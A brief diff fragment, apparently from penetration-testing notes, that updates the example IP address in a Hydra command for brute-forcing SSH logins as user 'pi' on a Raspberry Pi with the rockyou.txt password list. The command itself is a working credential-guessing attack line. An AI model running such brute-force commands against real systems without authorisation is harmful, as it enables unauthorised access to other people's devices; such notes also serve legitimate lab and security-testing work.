@@ -5,4 +5,4 @@
 hydra -l pi -P /usr/share/wordlists/rockyou.txt ssh://<raspberry-ip>
 
 # Example:
-# hydra -l pi -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.55
+# hydra -l pi -P /usr/share/wordlists/rockyou.txt ssh://192.168.132.72
